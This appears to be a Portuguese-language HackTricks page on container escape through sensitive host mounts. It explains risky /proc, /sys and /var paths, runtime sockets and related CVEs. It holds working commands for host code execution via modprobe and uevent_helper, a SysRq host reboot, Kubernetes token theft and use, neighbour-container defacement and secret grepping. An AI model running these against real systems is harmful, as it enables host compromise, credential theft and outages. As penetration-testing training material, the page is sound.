# Montagens Sensíveis do Host

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

As montagens do host são uma das superfícies práticas mais importantes para container-escape porque frequentemente colapsam uma visão de processo cuidadosamente isolada de volta para a visibilidade direta dos recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, ou caminhos relacionados a dispositivos podem expor controles do kernel, credenciais, filesystems de containers vizinhos e interfaces de gerenciamento em runtime.

Esta página existe separadamente das páginas de proteção individuais porque o modelo de abuso é transversal. Uma montagem do host gravável é perigosa em parte por causa de mount namespaces, em parte por causa de user namespaces, em parte por causa da cobertura do AppArmor ou SELinux, e em parte por causa do caminho exato do host que foi exposto. Tratá-la como um tópico próprio torna a superfície de ataque muito mais fácil de raciocinar.

## `/proc` Exposure

procfs contém tanto informações ordinárias de processos quanto interfaces de controle do kernel de alto impacto. Um bind mount como `-v /proc:/host/proc` ou uma visão do container que exponha entradas de proc inesperadamente graváveis pode, portanto, levar à divulgação de informações, negação de serviço ou execução direta de código no host.

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas procfs de alto valor estão visíveis ou graváveis:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses caminhos são interessantes por diferentes razões. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar caminhos de execução de código no host quando graváveis. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes poderosas de reconhecimento para exploração do kernel. `sched_debug` e `mountinfo` revelam o contexto de processo, cgroup e sistema de arquivos que podem ajudar a reconstruir a disposição do host a partir de dentro do container.

O valor prático de cada caminho é diferente, e tratar todos como se tivessem o mesmo impacto dificulta a triagem:

- `/proc/sys/kernel/core_pattern`
Se gravável, este é um dos caminhos do procfs de maior impacto porque o kernel executa um pipe handler após um crash. Um container que consiga apontar `core_pattern` para um payload armazenado no seu overlay ou em um caminho montado do host pode frequentemente obter execução de código no host. Veja também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
Esse caminho controla o userspace helper usado pelo kernel quando precisa invocar a lógica de carregamento de módulos. Se gravável a partir do container e interpretado no contexto do host, pode se tornar outro primitivo de execução de código no host. É especialmente interessante quando combinado com uma forma de disparar o caminho do helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente não é um primitivo limpo de escape, mas pode converter pressão de memória em negação de serviço em todo o host ao transformar condições OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registro for gravável, o atacante pode registrar um handler para um valor magic escolhido e obter execução no contexto do host quando um arquivo compatível for executado.
- `/proc/config.gz`
Útil para triagem de exploits do kernel. Ajuda a determinar quais subsistemas, mitigations e recursos opcionais do kernel estão habilitados sem precisar de metadados de pacotes do host.
- `/proc/sysrq-trigger`
Principalmente um caminho de negação de serviço, mas muito sério. Pode rebootar, causar panic ou de outro modo interromper o host imediatamente.
- `/proc/kmsg`
Revela mensagens do kernel ring buffer. Útil para fingerprinting do host, análise de crashes e, em alguns ambientes, para leaking de informações úteis à exploração do kernel.
- `/proc/kallsyms`
Valioso quando legível porque expõe informações de símbolos exportados do kernel e pode ajudar a derrotar suposições de randomização de endereços durante o desenvolvimento de exploits do kernel.
- `/proc/[pid]/mem`
É uma interface direta para a memória do processo. Se o processo alvo for alcançável com as condições do tipo ptrace necessárias, pode permitir ler ou modificar a memória de outro processo. O impacto real depende fortemente de credenciais, `hidepid`, Yama e restrições de ptrace, então é um caminho poderoso, porém condicional.
- `/proc/kcore`
Expõe uma visão estilo core-image da memória do sistema. O arquivo é enorme e de uso desconfortável, mas se for significativamente legível indica uma superfície de memória do host mal exposta.
- `/proc/kmem` e `/proc/mem`
Interfaces históricas de memória bruta de alto impacto. Em muitos sistemas modernos estão desativadas ou fortemente restritas, mas se presentes e utilizáveis devem ser tratadas como achados críticos.
- `/proc/sched_debug`
Leaks scheduling and task information que pode expor identidades de processos do host mesmo quando outras visões de processos parecem mais limpas que o esperado.
- `/proc/[pid]/mountinfo`
Extremamente útil para reconstruir onde o container realmente vive no host, quais caminhos são suportados por overlay e se um mount gravável corresponde ao conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou detalhes do overlay forem legíveis, use-os para recuperar o caminho no host do filesystem do container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque várias técnicas de execução no host exigem transformar um caminho dentro do container no caminho correspondente do ponto de vista do host.

### Exemplo Completo: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` for gravável a partir do container e o helper path for interpretado no contexto do host, ele pode ser redirecionado para um payload controlado pelo atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
O gatilho exato depende do alvo e do comportamento do kernel, mas o ponto importante é que um caminho helper gravável pode redirecionar uma futura invocação do helper do kernel para conteúdo no host controlado pelo atacante.

### Exemplo completo: Reconhecimento do Kernel com `kallsyms`, `kmsg`, e `config.gz`

Se o objetivo for avaliação da possibilidade de exploração em vez de fuga imediata:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Esses comandos ajudam a determinar se informações úteis de símbolos estão visíveis, se mensagens recentes do kernel revelam estados relevantes e quais recursos ou mitigações do kernel estão compilados. O impacto geralmente não é uma fuga direta, mas pode reduzir significativamente o tempo de triagem de vulnerabilidades do kernel.

### Exemplo completo: SysRq Host Reboot

Se `/proc/sysrq-trigger` for gravável e estiver visível no host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é a reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais séria do que a divulgação de informações.

## `/sys` Exposição

sysfs expõe grandes quantidades de estado do kernel e dos dispositivos. Alguns caminhos do sysfs são úteis principalmente para fingerprinting, enquanto outros podem afetar a execução de helpers, o comportamento de dispositivos, a configuração de security-modules ou o estado do firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos importam por motivos diferentes. `/sys/class/thermal` pode influenciar o comportamento de gerenciamento térmico e, portanto, a estabilidade do host em ambientes mal expostos. `/sys/kernel/vmcoreinfo` pode leak crash-dump and kernel-layout information que ajuda no fingerprinting de host em baixo nível. `/sys/kernel/security` é a interface `securityfs` usada por Linux Security Modules, então acesso inesperado ali pode expor ou alterar o estado relacionado a MAC. Os caminhos de variáveis EFI podem afetar configurações de boot respaldadas pelo firmware, tornando-os muito mais sérios do que arquivos de configuração comuns. `debugfs` sob `/sys/kernel/debug` é especialmente perigoso porque é propositalmente uma interface orientada a desenvolvedores com expectativas de segurança bem menores do que as APIs do kernel endurecidas para produção.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
- `/sys/kernel/security` pode revelar se AppArmor, SELinux, ou outra superfície LSM está visível de uma forma que deveria ter permanecido apenas no host.
- `/sys/kernel/debug` é frequentemente a descoberta mais alarmante desse grupo. Se `debugfs` estiver montado e legível ou gravável, espere uma ampla superfície voltada ao kernel cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas se presente tem alto impacto porque afeta configurações suportadas por firmware em vez de arquivos de runtime ordinários.
- `/sys/class/thermal` é principalmente relevante para a estabilidade do host e interação com hardware, não para uma fuga elegante em estilo shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte para fingerprinting do host e análise de crash, útil para entender o estado de baixo nível do kernel.

### Exemplo completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` for gravável, o kernel pode executar um helper controlado pelo atacante quando um `uevent` for disparado:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
A razão pela qual isso funciona é que o helper path é interpretado do ponto de vista do host. Uma vez acionado, o helper é executado no contexto do host em vez de dentro do container atual.

## `/var` Exposição

Montar o `/var` do host em um container é frequentemente subestimado porque não parece tão dramático quanto montar `/`. Na prática, pode ser suficiente para alcançar runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens e neighboring application filesystems. Em nós modernos, `/var` é frequentemente onde o estado de container mais operacionalmente interessante realmente vive.

### Kubernetes Exemplo

Um pod com `hostPath: /var` pode frequentemente ler os projected tokens de outros pods e overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicação sem importância ou credenciais de cluster de alto impacto. Um service-account token legível pode imediatamente transformar local code execution em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele consegue acessar em vez de parar na descoberta do token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser bem maior do que o acesso local ao nó. Um token com RBAC amplo pode transformar um `/var` montado em um comprometimento em todo o cluster.

### Docker e containerd — Exemplo

Em hosts Docker, os dados relevantes costumam estar em `/var/lib/docker`, enquanto em nós Kubernetes com containerd podem estar em `/var/lib/containerd` ou em caminhos específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expõe conteúdos de snapshot graváveis de outra carga de trabalho, o atacante pode ser capaz de alterar arquivos da aplicação, plantar conteúdo web ou modificar scripts de inicialização sem tocar na configuração atual do container.

Ideias concretas de abuso quando for encontrado conteúdo de snapshot gravável:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais categorias de impacto do `/var` montado: adulteração de aplicações, recuperação de segredos e movimento lateral para cargas de trabalho vizinhas.

## Sockets de runtime

Montagens sensíveis do host frequentemente incluem sockets de runtime em vez de diretórios completos. Esses são tão importantes que merecem repetição explícita aqui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para fluxos completos de exploração assim que um desses sockets estiver montado.

Como um padrão rápido de interação inicial:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se um destes tiver sucesso, o caminho de "mounted socket" para "start a more privileged sibling container" geralmente é muito mais curto do que qualquer caminho de kernel breakout.

## CVEs relacionados a mounts

Mounts do host também intersectam com vulnerabilidades de runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` em `runc`, onde um leaked directory file descriptor poderia colocar o diretório de trabalho no host filesystem.
- `CVE-2024-23651` e `CVE-2024-23653` em BuildKit, onde OverlayFS copy-up races poderiam produzir host-path writes durante builds.
- `CVE-2024-1753` em Buildah e Podman build flows, onde crafted bind mounts durante build poderiam expor `/` read-write.
- `CVE-2024-40635` em containerd, onde um valor grande de `User` poderia overflow em comportamento de UID 0.

Esses CVEs importam aqui porque mostram que o tratamento de mounts não é apenas sobre a configuração do operador. O runtime em si também pode introduzir condições de escape dirigidas por mounts.

## Verificações

Use estes comandos para localizar rapidamente as exposições de mounts de maior valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- O root do host, `/proc`, `/sys`, `/var` e sockets de runtime são todas descobertas de alta prioridade.
- Entradas graváveis em `/proc/sys` frequentemente significam que a montagem está expondo controles do kernel globais do host em vez de uma visão segura do container.
- Caminhos montados em `/var` merecem revisão de credenciais e das cargas de trabalho vizinhas, não apenas revisão do sistema de arquivos.
{{#include ../../../banners/hacktricks-training.md}}
